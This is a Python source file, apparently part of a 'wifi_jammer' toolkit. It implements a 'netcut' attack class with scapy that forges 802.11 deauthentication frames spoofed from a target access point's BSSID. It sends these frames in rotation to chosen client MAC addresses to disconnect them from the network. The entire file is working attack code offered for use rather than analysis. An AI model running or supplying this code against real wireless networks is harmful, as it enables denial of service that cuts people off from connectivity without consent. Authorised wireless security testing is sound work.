"""
Netcut attack implementation — selective client deauthentication.
"""

from typing import Optional, List
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Deauth
from wifi_jammer.attacks.base_attack import BaseAttack
from wifi_jammer.core.interfaces import AttackConfig


class NetcutAttack(BaseAttack):
    """Targeted deauthentication attack against specific clients."""

    def __init__(self, logger=None):
        super().__init__(logger)
        self._target_clients: List[str] = []
        self._client_index: int = 0
        self._active = False

    def _create_packet(self) -> Optional[Packet]:
        """Create deauth packet targeting the next client in rotation."""
        if not self._target_clients:
            return None

        destination = self._target_clients[self._client_index % len(self._target_clients)]
        self._client_index += 1

        try:
            packet = (
                RadioTap() /
                Dot11(
                    addr1=destination,
                    addr2=self._config.target_bssid,
                    addr3=self._config.target_bssid
                ) /
                Dot11Deauth(reason=7)
            )
            return packet
        except Exception as e:
            self.logger.error(f"Failed to create netcut packet: {e}")
            return None

    def execute(self, config: AttackConfig) -> bool:
        """Execute netcut attack against configured target clients."""
        if not config.target_bssid:
            self.logger.error("Target BSSID required for netcut attack")
            return False

        self._target_clients = list(config.target_clients)
        if not self._target_clients:
            self.logger.error("No target clients specified for netcut attack")
            return False

        self._active = True
        self._client_index = 0
        return super().execute(config)

    def stop(self) -> None:
        """Stop the netcut attack."""
        self._active = False
        self._target_clients = []
        super().stop()
